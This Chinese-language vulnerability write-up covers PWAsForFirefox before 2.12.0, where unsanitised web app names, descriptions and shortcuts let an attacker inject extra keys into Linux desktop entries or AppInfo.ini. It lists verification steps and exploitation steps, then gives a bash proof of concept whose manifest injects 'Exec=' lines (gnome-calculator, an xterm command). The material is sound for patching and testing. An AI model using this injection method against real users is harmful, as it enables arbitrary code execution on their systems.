验证漏洞存在方法
    - 检查PWAsForFirefox版本是否低于2.12.0
    - 检查系统是否为Linux或PortableApps.com平台
    - 验证Web应用属性（如名称、描述、快捷方式）是否被正确清理
    - 检查XDG Desktop Entries或AppInfo.ini文件中是否存在注入的恶意键值

漏洞利用方法
    - 创建一个恶意Web应用，在应用属性中注入额外的行
    - 在应用名称、描述或快捷方式字段中注入类似`Exec=恶意命令`的键值对
    - 使用PWAsForFirefox安装该恶意Web应用
    - 当用户启动该Web应用时，注入的Exec命令将被执行
    - 攻击者可以通过这种方式在受害者系统上运行任意代码

PoC示例：
```bash
# 检查PWAsForFirefox版本
pwasforfirefox --version

# 检查系统平台
uname -a

# 创建恶意Web应用配置文件
cat > malicious-webapp.json << 'EOF'
{
  "name": "Malicious App\nExec=gnome-calculator",
  "description": "A malicious web app\nIcon=malicious.png",
  "start_url": "https://malicious.example.com",
  "shortcuts": [
    {
      "name": "Open Malicious\nExec=xterm -e 'echo hacked'",
      "url": "https://malicious.example.com/evil"
    }
  ]
}
EOF

# 使用PWAsForFirefox安装恶意Web应用
# pwasforfirefox install malicious-webapp.json

# 检查生成的桌面文件
# cat ~/.local/share/applications/pwasforfirefox-*.desktop
```
